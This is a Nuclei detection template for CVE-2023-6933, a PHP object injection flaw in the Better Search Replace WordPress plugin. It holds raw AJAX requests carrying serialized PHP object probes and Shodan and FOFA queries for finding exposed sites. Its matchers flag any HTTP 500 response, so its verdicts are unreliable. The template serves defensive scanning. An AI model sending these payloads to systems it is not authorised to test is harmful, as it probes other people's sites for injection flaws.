id: CVE-2023-6933

info:
  name: Better Search Replace < 1.4.5 - PHP Object Injection
  author: Trex
  severity: critical
  description: |
    The Better Search Replace WordPress plugin before 1.4.5 contains a PHP Object Injection vulnerability 
    due to unsafe deserialization of user input in the AJAX handler. This allows unauthenticated attackers 
    to inject arbitrary PHP objects into the application, potentially leading to Remote Code Execution 
    through gadget chain exploitation.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2023-6933
    - https://github.com/w2xim3/CVE-2023-6933
    - https://plugins.trac.wordpress.org/browser/better-search-replace/trunk/includes/class-bsr-db.php#L334
    - https://vulncheck.com/xdb/a42df92e4069
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2023-6933
    cwe-id: CWE-502
    epss-score: 0.00043
    epss-percentile: 0.09271
    cpe: cpe:2.3:a:deliciousbrains:better_search_replace:*:*:*:*:*:wordpress:*:*
  metadata:
    verified: true
    max-request: 4
    vendor: deliciousbrains
    product: better_search_replace
    framework: wordpress
    shodan-query: 'http.component:"WordPress" inurl:"/wp-content/plugins/better-search-replace/"'
    fofa-query: 'body="better-search-replace" && body="wp-content"'
  tags: cve,cve2023,wp,wp-plugin,wordpress,better-search-replace,php-object-injection,unauth

variables:
  test_marker: "nuclei_cve_2023_6933_{{randstr}}"
  safe_payload1: 'O:8:"stdClass":1:{s:4:"test";s:{{len(test_marker)}}:"{{test_marker}}";}'
  safe_payload2: 'O:9:"Exception":1:{s:7:"message";s:{{len(test_marker)}}:"{{test_marker}}";}'

http:
  - raw:
      - |
        GET /wp-content/plugins/better-search-replace/readme.txt HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (compatible; Nuclei CVE-2023-6933)
        
      - |
        POST /wp-admin/admin-ajax.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        User-Agent: Mozilla/5.0 (compatible; Nuclei CVE-2023-6933)
        
        action=bsr_search_replace&search_for=test&replace_with=test&dry_run=1
        
      - |
        POST /wp-admin/admin-ajax.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        User-Agent: Mozilla/5.0 (compatible; Nuclei CVE-2023-6933)
        
        action=bsr_search_replace&search_for={{url_encode(safe_payload1)}}&replace_with=test&select_tables[]=wp_posts&dry_run=1
        
      - |
        POST /wp-admin/admin-ajax.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        User-Agent: Mozilla/5.0 (compatible; Nuclei CVE-2023-6933)
        
        action=bsr_search_replace&search_for={{url_encode(safe_payload2)}}&replace_with=replacement&select_tables[]=wp_options&dry_run=1

    matchers-condition: and
    matchers:
      - type: word
        part: body_1
        words:
          - "Better Search Replace"
          - "Contributors: wpengine"
        condition: and
        name: "plugin-detected"

      - type: dsl
        dsl:
          - 'status_code_2 == 500 || status_code_3 == 500 || status_code_4 == 500'
        name: "ajax-endpoint-error"

      - type: dsl
        dsl:
          - 'status_code_2 == 500 || status_code_3 == 500 || status_code_4 == 500'
        name: "potential-vulnerability"

    extractors:
      - type: regex
        part: body_1
        name: plugin_readme_evidence
        regex:
          - "(Better Search Replace[^\\n]*)"
        group: 1

      - type: regex
        part: body_2,body_3,body_4
        name: ajax_responses
        regex:
          - "^(.{0,200})"
        group: 1

      - type: regex
        part: body_3,body_4
        name: injection_evidence
        regex:
          - "({{test_marker}})"
          - "(PHP (?:Fatal error|Warning|Notice).*unserialize.*)"
          - "(Object of class [^\\s]+ could not be converted.*)"
          - "(serialize.*data.*)"
        group: 1

      - type: kval
        part: header
        kval:
          - content-type
          - x-powered-by
          - server

      - type: regex
        part: body
        name: error_messages
        regex:
          - "((?:Fatal error|Warning|Notice).*)"
          - "(better-search-replace.*error.*)"
        group: 1